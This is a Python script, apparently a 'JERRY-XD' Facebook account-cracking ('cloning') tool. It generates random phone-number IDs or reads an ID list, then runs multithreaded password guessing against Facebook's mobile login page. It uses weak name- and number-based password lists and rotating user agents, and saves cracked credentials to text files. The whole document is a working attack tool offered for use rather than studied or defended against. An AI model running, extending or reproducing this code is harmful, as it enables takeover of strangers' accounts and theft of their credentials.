#!/usr/bin/python3
#-*-coding:utf-8-*-
# Updated: JERRY-XD V3 (No-Login / No-File / Random Clone)

import os, requests, re, bs4, sys, json, time, random, datetime, subprocess, threading, itertools
from concurrent.futures import ThreadPoolExecutor as BilalBSN
from datetime import datetime

# --- SETUP ---
def install_modules():
    modules = ['requests', 'bs4', 'futures']
    for mod in modules:
        try:
            __import__(mod)
        except ImportError:
            os.system(f'pip install {mod}')

install_modules()

# --- COLORS ---
P = '\x1b[1;97m' # White
M = '\x1b[1;91m' # Red
H = '\x1b[1;92m' # Green
K = '\x1b[1;93m' # Yellow
O = '\x1b[1;96m' # Cyan
N = '\x1b[0m'    # Reset

# --- GLOBAL DATA ---
ok = []
cp = []
loop = 0
id = []

def logo():
    os.system('clear')
    print(f"""{O}                                         
.oPYo.  o    o      .oo  .oPYo. .oPYo. o 
8    8  8    8     .P 8  8   `8 8      8 
8      o8oooo8    .P  8 o8YooP' `Yooo. 8 
8       8    8   oPooo8  8   `b     `8 8 
8    8  8    8  .P    8  8    8      8 8 
`YooP'  8    8 .P     8  8    8 `YooP' 8 
:.....::..:::....:::::..:..:::..:.....:..
{P}_______________________________________
|Owner    | JERRY-XD [2025]             |
|Features | File + Random + No Login    |
|Status   | 100% Free Bypass            |
|______________________________________|
""")

def hasil():
    print(f'\n{P}----------------------------------------------')
    print(f'{H} Process Complete...')
    print(f'{P} TOTAL OK : {H}{len(ok)} {P}')
    print(f'{P} TOTAL CP : {K}{len(cp)} {P}')
    print('----------------------------------------------')
    input(f"\n{P} Press Enter To Go Back ")
    main_menu()

# --- MAIN MENU ---
def main_menu():
    logo()
    print(" [1] FILE CLONING (MT-FAST)")
    print(" [2] RANDOM UID CLONING (NO FILE)")
    print(" [3] JOIN WHATSAPP")
    print(" [0] EXIT")
    print(' -------------------------------------------')
    select = input(' Select Option : ')
    if select == '1':
        crack_file().bilo()
    elif select == '2':
        random_clone()
    elif select == '3':
        os.system('xdg-open https://chat.whatsapp.com/JBKbDYqYiJh5sl9TeEkCCh')
        main_menu()
    else:
        exit()

# --- RANDOM CLONING LOGIC ---
def random_clone():
    global id
    logo()
    print(" [?] Example: 0300, 0306, 0315, 0345")
    code = input(" [+] Enter Network Code: ")
    print("\n [?] Example: 2000, 5000, 10000")
    limit = int(input(" [+] Enter Limit: "))
    
    for _ in range(limit):
        suffix = ''.join(random.choices('0123456789', k=7))
        id.append(code + suffix)
    
    start_cloning(random_mode=True)

# --- CLONING CLASS ---
class crack_file:
    def bilo(self):
        global id
        logo()
        file_path = input(f'{P} [+] Input File Path : {K}')
        try:
            id = open(file_path).read().splitlines()
            start_cloning(random_mode=False)
        except FileNotFoundError:
            print(f'{M} [!] File Not Found!'); time.sleep(2); self.bilo()

def start_cloning(random_mode):
    global id, loop
    loop = 0
    logo()
    print(f' {H}[*] TOTAL IDs : {len(id)}')
    print(f' {H}[*] CLONING STARTED... ')
    print(' -------------------------------------------')
    
    with BilalBSN(max_workers=30) as jerry:
        for user in id:
            if random_mode:
                # Password list for Random Number cloning
                pwx = [user, user[:6], user[5:], 'pakistan', 'khan123', 'khan12345', '786786']
                uid = user
            else:
                # Password list for File cloning
                uid, name = user.split('|')
                first = name.split(' ')[0].lower()
                pwx = [name, name.lower(), first+'123', first+'1234', first+'12345', first+'786']
            
            jerry.submit(metode_engine, uid, pwx)
    hasil()

def metode_engine(user, pwx):
    global ok, cp, loop
    sys.stdout.write(f'\r [JERRY-XD] {loop}/{len(id)} | OK:{len(ok)} | CP:{len(cp)} ')
    sys.stdout.flush()
    
    # Modern User-Agents for 2025
    ua_list = [
        "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.70 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; RMX3301) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36"
    ]
    
    for pw in pwx:
        try:
            session = requests.Session()
            header = {
                'Host': 'm.facebook.com',
                'upgrade-insecure-requests': '1',
                'user-agent': random.choice(ua_list),
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
            }
            # Simplified login attempt
            res = session.get(f'https://m.facebook.com/login.php', headers=header).text
            payload = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(res)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(res)).group(1),
                "email": user,
                "pass": pw
            }
            session.post('https://m.facebook.com/login.php', data=payload, headers=header, allow_redirects=False)
            
            if 'c_user' in session.cookies.get_dict():
                print(f'\r{H} [JERRY-OK] {user} | {pw} ')
                ok.append(user)
                open('jerry-ok.txt','a').write(f'{user}|{pw}\n')
                break
            elif 'checkpoint' in session.cookies.get_dict():
                print(f'\r{K} [JERRY-CP] {user} | {pw} ')
                cp.append(user)
                open('jerry-cp.txt','a').write(f'{user}|{pw}\n')
                break
        except:
            pass
    loop += 1

if __name__ == '__main__':
    main_menu()
